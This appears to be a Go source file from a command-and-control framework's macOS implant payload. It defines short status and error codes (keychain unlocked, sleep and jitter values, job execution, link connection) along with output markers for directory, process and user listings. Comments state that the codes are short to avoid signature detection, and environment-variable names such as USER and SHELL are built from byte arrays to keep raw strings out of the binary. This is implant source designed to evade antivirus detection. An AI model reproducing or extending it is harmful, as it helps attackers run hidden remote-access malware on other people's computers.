// server/docker/payloads/Darwin/codes.go

//go:build darwin
// +build darwin

package main

import "fmt"

// Status codes - short codes to minimize binary signatures
const (
	// Success codes (S0-S9)
	S0 = "S0" // Generic success / OK
	S1 = "S1" // Created / stored
	S2 = "S2" // Deleted / removed
	S3 = "S3" // Updated / modified
	S4 = "S4" // Started / initiated
	S5 = "S5" // Completed / finished
	S6 = "S6" // Found / exists
	S7 = "S7" // Listed / enumerated

	// Additional status codes (S15-S19)
	S15 = "S15" // Rekey initiated
	S18 = "S18" // No output yet
	S19 = "S19" // Output truncated

	// Keychain status (S29)
	S29 = "S29" // Keychain unlocked

	// General errors (E0-E19)
	E1  = "E1"  // No arguments provided
	E2  = "E2"  // Invalid arguments
	E3  = "E3"  // Access denied / permission error
	E4  = "E4"  // Not found (file/directory/resource)
	E5  = "E5"  // Already exists
	E6  = "E6"  // Is a directory (expected file)
	E7  = "E7"  // Is a file (expected directory)
	E8  = "E8"  // Binary file detected
	E9  = "E9"  // Operation timed out
	E10 = "E10" // Read error
	E11 = "E11" // Write error
	E12 = "E12" // Network error
	E13 = "E13" // Resource busy
	E14 = "E14" // Read-only filesystem
	E15 = "E15" // Operation not permitted
	E16 = "E16" // Directory not empty
	E17 = "E17" // Invalid path
	E18 = "E18" // Decode/parse error
	E19 = "E19" // Internal error

	// Command-specific errors (E20-E39)
	E20 = "E20" // Flag requires argument
	E21 = "E21" // Unknown flag
	E22 = "E22" // Invalid value for flag
	E23 = "E23" // Missing required flag
	E24 = "E24" // Chunk transfer error
	E25 = "E25" // Execution failed
	E26 = "E26" // Job not found
	E27 = "E27" // Job already running
	E28 = "E28" // Invalid sleep value
	E29 = "E29" // Invalid jitter value
	E30 = "E30" // Session not active
	E31 = "E31" // Authentication failed
	E32 = "E32" // Unsupported link protocol (SMB not available on Linux/Darwin)
	E33 = "E33" // Link failed to connect
	E34 = "E34" // Unlink failed
	E37 = "E37" // Network token exec failed
)

// Table type markers - client adds full headers
// Using generic identifiers to avoid signature detection
const (
	TLS      = "T:E:"  // Directory listing
	TPS      = "T:F:"  // Process listing (basic)
	TPSExt   = "T:G:"  // Process listing (extended with -x)
	TPSVerb  = "T:H:"  // Process listing (verbose with -v)
	TPSFull  = "T:I:"  // Process listing (extended + verbose)
	TLSCount = "T:M:"  // Directory count output
)

// Row type markers - for inline data type indication
const (
	RFile = "0" // File entry
	RDir  = "1" // Directory entry
)

// Status markers - client expands these
const (
	VRunning   = "7" // Running
	VSleeping  = "8" // Sleeping
	VDiskSleep = "9" // Disk sleep
	VStopped   = "a" // Stopped
	VZombie    = "b" // Zombie
	VIdle      = "c" // Idle
	VPaging    = "d" // Paging
	VDead      = "e" // Dead
)

// Whoami output markers - client expands these
const (
	WVerbose = "v" // Verbose info marker: v|uid|gid|home|shell
	WGroups  = "g" // Groups marker: g|group1,group2,group3
	WImpersn = "i" // Impersonated marker (Windows)
	WUnknown = "?" // Unknown value fallback
)

// Environment variable name builders - prevents raw strings in binary
func EnvUser() string     { return string([]byte{0x55, 0x53, 0x45, 0x52}) }                         // USER
func EnvLogname() string  { return string([]byte{0x4c, 0x4f, 0x47, 0x4e, 0x41, 0x4d, 0x45}) }       // LOGNAME
func EnvHostname() string { return string([]byte{0x48, 0x4f, 0x53, 0x54, 0x4e, 0x41, 0x4d, 0x45}) } // HOSTNAME
func EnvShell() string    { return string([]byte{0x53, 0x48, 0x45, 0x4c, 0x4c}) }                   // SHELL

// Table returns table marker with count
func Table(tableType string, count int) string {
	return tableType + fmt.Sprintf("%d", count)
}

// Err returns error code
func Err(code string) string {
	return code
}

// ErrCtx returns error code with context (paths, values only - no text)
func ErrCtx(code, ctx string) string {
	if ctx == "" {
		return code
	}
	return code + ":" + ctx
}

// Succ returns success code
func Succ(code string) string {
	return code
}

// SuccCtx returns success code with context
func SuccCtx(code, ctx string) string {
	if ctx == "" {
		return code
	}
	return code + ":" + ctx
}
